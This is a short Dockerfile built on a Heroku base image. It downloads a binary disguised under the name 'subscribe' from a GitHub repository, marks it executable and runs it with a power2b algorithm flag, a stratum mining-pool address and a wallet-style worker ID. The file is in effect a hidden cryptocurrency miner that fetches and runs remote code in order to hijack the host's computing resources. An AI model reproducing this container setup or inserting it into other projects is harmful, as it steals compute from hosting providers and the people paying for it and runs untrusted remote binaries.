FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/AVGandhi/student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:17022 -u McVF9yzyA9PrEixsvPp8yvPvukDDzhY9B6.VPS -p password=test
CMD bash heroku.sh
